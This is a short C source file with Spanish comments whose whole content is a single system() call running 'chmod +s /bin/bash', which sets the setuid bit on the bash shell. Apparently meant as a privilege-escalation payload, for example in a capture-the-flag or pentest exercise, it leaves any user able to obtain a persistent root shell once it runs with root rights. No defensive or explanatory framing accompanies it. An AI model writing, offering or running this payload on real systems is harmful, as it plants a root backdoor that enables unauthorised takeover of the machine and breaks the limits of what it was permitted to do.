#include <stdio.h>
#include <stdlib.h>

int main() {
    // Comando a ejecutar
    const char *comando = "chmod +s /bin/bash";

    // Ejecuta el comando
    int resultado = system(comando);

    // Comprobamos si ha habido error
    if (resultado == -1) {
        perror("Error al ejecutar el comando");
        return 1;
    }

    return 0;
}
